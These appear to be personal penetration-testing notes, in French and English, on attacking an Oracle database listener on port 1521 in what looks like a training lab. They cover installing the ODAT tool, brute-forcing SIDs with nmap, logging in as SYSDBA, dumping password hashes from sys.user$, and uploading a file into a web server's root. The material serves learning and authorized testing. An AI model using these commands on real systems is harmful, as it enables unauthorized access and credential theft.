---
public: true 
#Tags: tag1, tag2
---

Ports : 
- 1521/tcp

## Enumeration

### Installation de l'outil d'énumération
-sid-brute
```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
sudo submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

### nmap - SID Bruteforcing

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

### odat.py
```shell-session
./odat.py all -s 10.129.204.235
```

### SQLplus - Log In
```shell-session
export ORACLE_HOME=/usr/lib/oracle/19.6/client64
export LD_LIBRARY_PATH="$ORACLE_HOME/lib"
export PATH="$ORACLE_HOME:$PATH"

$ sqlplus <user>/<password@"$TARGET_IP"/<DB_SID>

sqlplus <user>/<password@"$TARGET_IP"/<DB_SID> as SYSDBA  <==
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

## Commandes utiles

```sql
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;

```

#### Oracle RDBMS - Extract Password Hashes
```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
```

#### Oracle RDBMS - File Upload
Si la vulnérabilité est exploitable et que le serveur héberge un serveur web dont on arrive à trouver le chemin d'accès à la racine, on peut tenter cela :
```shell-session
$ echo "Oracle File Upload Test" > testing.txt
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[...]
```

Valider l'upload
```shell-session
curl -X GET http://10.129.204.235/testing.txt
```